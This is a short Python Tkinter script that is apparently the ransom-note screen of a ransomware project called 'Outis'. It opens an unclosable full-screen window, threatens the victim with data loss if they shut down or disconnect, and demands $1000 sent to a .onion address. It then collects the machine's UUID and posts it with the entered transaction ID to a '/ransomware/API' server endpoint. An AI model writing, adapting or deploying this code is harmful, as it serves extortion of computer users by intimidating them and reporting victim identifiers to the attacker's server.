
import tkinter as tk
import subprocess
import requests
import tkinter.messagebox
debug = True


def display():

    def upload_trans():
        UUID = \
        str(subprocess.check_output('wmic csproduct get UUID').strip()).replace("\\r", "").replace("\\t", "").replace(
            "\\n", "").split(" ")[-1].strip("'")
        trans_ID = str(textbox.get("1.0", "end-1c"))
        if debug is True: print(UUID, trans_ID)
        print(trans_ID)
        if trans_ID.lower() == "professor":
            disp.destroy()

        url = "http://192.168.1.2/ransomware/API/update.php"
        data = {'UUID': UUID, 'trans_ID': trans_ID}
        save = requests.post(url, data=data).json()
        print("Server Response:", save)

    def disable_x():
        tk.messagebox.showinfo("LOL", "Seriously?")

    brief = """
    Don't try to close, force-close, shutdown or disconnect from the internet. 
    Or else even we can't give you your data back.
    """
    disp = tk.Tk()
    width = disp.winfo_screenwidth()
    height = disp.winfo_screenheight()
    disp.geometry("%dx%d" % (width, height))
    disp.title("Outis")
    disp.protocol("WM_DELETE_WINDOW", disable_x)
    label = tk.Label(disp, text=brief, font=('Arial', 20))
    label.pack(padx=20, pady=20)

    label = tk.Label(disp, text="Pay 1000$ to abc.onion and share transaction ID", font=('Arial', 15))
    label.pack()

    textbox = tk.Text(disp, height=1, width=50)
    textbox.pack(padx=10, pady=20)

    button = tk.Button(disp, text="Submit", command=upload_trans)
    button.pack()

    disp.mainloop()


display()
